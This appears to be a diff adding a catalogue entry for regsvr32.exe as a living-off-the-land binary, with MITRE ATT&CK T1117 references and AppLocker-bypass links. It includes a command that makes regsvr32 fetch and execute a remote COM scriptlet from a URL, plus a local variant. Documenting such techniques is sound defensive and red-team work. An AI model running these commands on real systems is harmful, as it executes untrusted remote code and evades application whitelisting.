@@ -1,0 +1,39 @@
+---
+Name: 'Regsvr32.exe'
+Description: 'Proxy execution of COM scriptlet code.'
+Created: '2018-05-25'
+Commands:
+  - Command: 'regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll'
+    Description: 'Execute the specified remote .SCT script with scrobj.dll'
+  - Command: 'regsvr32.exe /s /u /i:file.sct scrobj.dll'
+    Description: 'Execute the specified local .SCT script with scrobj.dll.'
+Windows Binary: true
+Bypasses Default AppLocker Rules: false
+Notes: ''
+MITRE:
+  - ID: 'T1117'
+    Link: 'https://attack.mitre.org/wiki/Technique/T1117'
+Atomic Red Teaming:
+  - Description: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md'
+    Code: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/RegSvr32.sct'    
+Full path:
+  - Path: 'C:\Windows\System32\regsvr32.exe'
+  - Path: 'C:\Windows\SysWOW64\regsvr32.exe'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/'
+  - Link: 'https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/'
+Acknowledgement:
+  - Name: 'Casey Smith'
+    TwitterHandle: '@Subtee'
+    Blog: 'https://subt0x11.blogspot.com/'
+---
